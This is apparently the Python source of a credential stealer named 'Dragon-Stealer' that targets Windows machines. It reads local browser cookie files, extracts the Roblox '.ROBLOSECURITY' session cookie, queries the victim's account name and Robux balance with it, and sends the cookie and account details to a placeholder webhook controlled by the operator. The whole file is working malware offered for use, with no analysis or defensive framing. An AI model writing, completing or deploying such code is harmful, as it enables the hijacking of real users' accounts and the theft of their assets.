import os
import shutil
import random
import platform
import requests
import platform
import sys
from urllib.request import Request, urlopen
from json import dumps
from zipfile import ZipFile


if platform.system() == "Windows":
    # If running on Windows, do nothing and continue with the program
    pass
else:
    # If not running on Windows, exit the program
    sys.exit()


hook = "WEBHOOK_HERE"


local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
Threadlist = []
footer = "Dragon-Stealer modified by Gumbobrot#4888 | https://github.com/Gumbobrot/"
avatar = "https://i.imgur.com/82x4nYk.jpeg"
color = 16711680


def LoadUrlib(hook, data="", files="", headers=""):
    for i in range(8):
        if headers != "":
            r = urlopen(Request(hook, data=data, headers=headers))
            return r
        r = urlopen(Request(hook, data=data))
        return r


def RobloxCookie(path, arg):
    global roblox_cookie
    pathC = path + arg + "\Cookies"
    tempfold = (
    temp + "wp" +
    "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
            for i in range(8)) + ".db")
    shutil.copy2(pathC, tempfold)
    os.remove(tempfold)
    roblox_cookie = ""
    with open(os.path.join(pathC, "Cookies", "DragonRobloxCookies.txt"), 'w', encoding="utf-8") as f:
        f.write(f"{footer}\n\n")
        with open(os.path.join(pathC, "Cookies", "DragonCookies.txt"), 'r', encoding="utf-8") as f2:
            try:
                for line in f2:
                    if ".ROBLOSECURITY" in line:
                        roblox_cookie = line.split(".ROBLOSECURITY")[1].strip()
                        f.write(roblox_cookie + "\n")
            except Exception:
                roblox_cookie = "No Roblox Cookies Found :("
        f2.close()
    f.close()


def UploadRobloxCookie(hook):
    headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
    info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
    data = {
        "content":
        "",
        "embeds": [{
            "color":
            color,
            "title": "Dragon  -  Roblox Cookie Grabber",
            "fields": [
                {
                    "name": "<:roblox_icon:1041819334969937931> Name:",
                    "value": f"`{info['UserName']}`",
                },
                {
                    "name": "<:robux_coin:1041813572407283842> Robux:",
                    "value": f"`{info['RobuxBalance']}`",
                    "inline": True,
                },
                {
                    "name": "🍪 Cookie:",
                    "value": f"`{roblox_cookie}`",
                    "inline": False,
                },
            ],
            "footer": {
                "text": footer,
                "icon_url": "",
            },
        }],
        "avatar_url":
        avatar,
        "username":
        "Dragon-Stealer",
        "attachments": [],
    }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
